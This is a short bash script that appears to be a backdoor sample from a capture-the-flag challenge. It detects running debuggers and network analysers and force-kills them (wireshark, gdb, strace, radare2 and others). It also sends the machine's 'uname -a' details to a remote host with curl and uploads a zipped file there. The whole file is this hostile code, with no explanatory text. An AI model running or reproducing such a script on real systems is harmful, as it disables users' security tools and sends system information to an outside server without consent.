#!/bin/bash
# No, flag is not hidden in this file

debuggers=$(ps auxf | grep "wireshark\|tshark\|idaq\|strace\|gdb\|edb\|lldb\|lida\|hopper\|r2\|radare2" | grep -v grep | wc -l)
if [ "$debuggers" -ge "0" ]
then
	curl -d "Oh, no! He's debugging! I'll kill them!!!!!!" -H "User-Agent: $(uname -a)" http://192.168.1.2/compiler/post.php?action=debugging\&count=$debuggers
fi
killall -9 wireshark
killall -9 tshark
killall -9 idaq
killall -9 strace
killall -9 gdb
killall -9 edb
killall -9 lldb
killall -9 lida
killall -9 hopper
killall -9 r2
killall -9 radare2

head -c100000 /dev/urandom > /tmp/random.txt
zip -r - /tmp/random.txt | curl -H "User-Agent: $(uname -a)" -F 'file=@-' http://192.168.1.2/compiler/post.php\?action\=upload -v
rm /tmp/random.txt

echo "Did you find the backdoor?" > ~/rctf-backdoor.txt
